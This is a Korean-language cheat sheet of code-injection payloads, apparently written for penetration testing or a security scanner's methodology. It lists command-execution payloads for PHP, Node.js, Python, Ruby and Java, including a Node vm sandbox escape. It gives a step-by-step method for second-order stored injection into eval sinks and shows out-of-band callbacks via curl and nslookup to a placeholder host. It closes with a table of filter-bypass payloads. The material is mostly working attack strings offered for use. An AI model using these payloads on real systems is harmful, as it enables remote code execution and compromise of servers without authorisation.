### 기본 페이로드 (언어별)

#### PHP
- `phpinfo()` — 실행 확인 (출력에 PHP 설정 노출)
- `print(7*7)` → `49` 반영 확인
- `${@phpinfo()}` — 가변변수 컨텍스트
- 2차: 저장 필드(예: writer_name)에 `'].phpinfo();//` 또는 `'.system('id').'` 삽입 후 배치/cron 트리거
- `echo 1337*1337;` → `1787569` (산술 반영으로 eval 입증)

#### JavaScript (Node)
- `process.version` 반영 — Node 실행 확인
- `require('child_process').execSync('id').toString()` — RCE
- `7*7` → `49`
- `global.process.mainModule.require('child_process')` (vm 샌드박스 탈출)

#### Python
- `__import__('os').popen('id').read()` — RCE
- `7*7` → `49`
- `str(__import__('os').getuid())`

#### Ruby
- `\`id\`` (백틱), `system('id')`, `7*7`

#### Java (ScriptEngine/Groovy)
- `"".execute()` (Groovy), `Runtime.getRuntime().exec('id')`
- `7*7` → `49`

### 2차(Stored) Code Injection 검증 절차

1. **저장 단계**: 사용자가 제어 가능한 입력 필드(닉네임, 프로필, 메모, 설정값 등)에 페이로드 삽입. 페이로드는 sink의 컨텍스트에 맞춰 구성:
   - sink가 `eval("\$arr['$VALUE'] = ...")`이면 `$VALUE`에 `'].phpinfo();#` 형태 (작은따옴표+대괄호 탈출)
2. **트리거 단계**: 저장된 값을 eval로 재사용하는 엔드포인트/배치를 호출 (예: 통계 집계 cron, 리포트 생성 페이지).
3. **관찰**: 응답·로그·사이드 이펙트(파일 생성, DNS 콜백)로 코드 실행 확인. 직접 출력이 없으면 OOB(`__import__('os').system('curl http://CALLBACK')` / `system('nslookup CALLBACK')`).

### 2차 패턴 예시 (eval 내 문자열 보간형)

DB 컬럼값을 eval 문자열에 보간하는 코드(`eval("\$arr['$row->col'] = \"$row->val\";")`)에서 `$row->col`/`$row->val`이 사용자 저장 데이터이면:

- 저장 단계: 해당 컬럼에 작은따옴표+대괄호 탈출 페이로드 삽입 — `${assert($_GET[c])}` 또는 `'].<PHP코드>;//`
- 트리거 단계: 그 컬럼을 eval로 재사용하는 배치/cron/리포트 엔드포인트 호출
- 관찰: 트리거 요청의 추가 파라미터(`?c=print(\`id\`);`)나 OOB 콜백으로 코드 실행 확인

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| `'` 차단 | 함수 호출 형태 `phpinfo()`, 가변변수 `${phpinfo()}`, HEX/chr 조합 |
| 키워드 `eval`/`system` 차단 | PHP 가변함수 `$_GET[a]($_GET[b])`, `call_user_func`, `array_map` |
| 길이 제한 | 짧은 `\`id\``, `phpinfo()` |
| `(` 차단 | PHP `include`/백틱, JS 템플릿 리터럴 |

### 참고사항

- assert/eval은 출력이 없을 수 있으므로 산술 반영(`7*7`)·시간 지연(`sleep`)·OOB 콜백으로 입증한다.
- 2차 Code Injection은 저장→트리거 두 요청이 분리되어 있어 일반 스캐너가 놓치기 쉽다. sink의 인자가 DB 컬럼이면 반드시 그 컬럼의 쓰기 경로를 추적한다.
- PHP 버전에 따라 `assert`/`create_function`/`/e` modifier 동작이 다르다. 운영 PHP 버전을 헤더(`X-Powered-By`)나 오류 메시지로 식별 후 페이로드 선택.
- `call_user_func($userInput)`는 임의 함수 호출(RCE는 인자 통제 필요)이므로 `DYNAMIC_CALL`로 구분 기록하되, `system`/`assert` 등 위험 함수 지정 가능하면 RCE로 승격.
